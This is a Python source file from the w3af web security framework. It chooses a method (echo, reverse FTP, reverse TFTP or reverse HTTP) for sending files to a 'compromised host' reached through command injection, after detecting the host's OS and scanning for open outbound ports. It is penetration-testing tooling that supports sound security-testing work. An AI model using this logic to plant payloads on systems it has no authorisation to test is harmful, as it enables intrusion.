'''
payloadTransferFactory.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.controllers.outputManager as om
from core.controllers.w3afException import *

from core.controllers.payloadTransfer.echoWin import echoWin
from core.controllers.payloadTransfer.echoLnx import echoLnx
from core.controllers.payloadTransfer.reverseFTP import reverseFTP
from core.controllers.payloadTransfer.clientlessReverseHTTP import clientlessReverseHTTP
from core.controllers.payloadTransfer.clientlessReverseTFTP import clientlessReverseTFTP

from core.controllers.intrusionTools.execMethodHelpers import *
from core.controllers.extrusionScanning.extrusionScanner import extrusionScanner

class payloadTransferFactory:
    '''
    This factory is pretty cool stuff, it uses an execMethod ( generated by os commanding, or some other vuln ) to determine
    what is the fastest method to send something to the compromised host. After determining what method to use, it will return
    the fastest method. 
    
    Transfers methods inherit from transfer factory and can be found in this directory. If you want to add a new method, you should
    create the file and add it to the toTest list that is defined in the first lines of this function.
    '''
    def __init__( self, execMethod ):
        self._execMethod = execMethod
        self._es = extrusionScanner( execMethod )

    def estimateTransferTime( self ):
        if self._es.canScan():
            return self._es.estimateScanTime() + 1
        else:
            return 1
        
    def getTransferHandler( self , inboundPort=None ):
        '''
        Do an extrusion scan and return the inbound open ports.
        If the caller sends an inboundPort, don't do an extrusion scan, just trust him and use that port.
        '''
        os = osDetectionExec( self._execMethod )
        if os == 'windows':
            echoTransfer = echoWin( self._execMethod, os )
        elif os == 'linux':
            echoTransfer = echoLnx( self._execMethod, os )
            
        toTest = []
        toTest.append( echoTransfer )
        try:
            if not inboundPort:
                inboundPort = self._es.getInboundPort()
        except w3afException, w3:
            om.out.error( 'The extrusion test failed, no reverse connect transfer methods can be used. Trying inband echo transfer method.' )
            om.out.error( 'Error: ' + str(w3) )
        except Exception, e:
            om.out.error('Unhandled exception: ' + str(e) )
        else:
            toTest.append( reverseFTP( self._execMethod, os, inboundPort ) )
            if os == 'windows':
                toTest.append( clientlessReverseTFTP( self._execMethod, os, inboundPort ) )
            elif os == 'linux':
                toTest.append( clientlessReverseHTTP( self._execMethod, os, inboundPort ) )
            
            # Test the fastest first and return the fastest one...
            def sortFunction( x ,y ):
                return cmp( y.getSpeed() , x.getSpeed() )
            toTest.sort( sortFunction )
            
        res = []
        for method in toTest:
            om.out.debug('Testing if "' + str(method) + '" is able to transfer a file to the compromised host.')
            if method.canTransfer():
                om.out.debug('The "' + str(method) + '" method is able to transfer a file to the compromised host.')
                return method
            else:
                om.out.debug('The "' + str(method) + '" method *FAILED* to transfer a file to the compromised host.')
        
        raise w3afException('Failed to transfer a file to the remote host! All the transfer methods failed.')
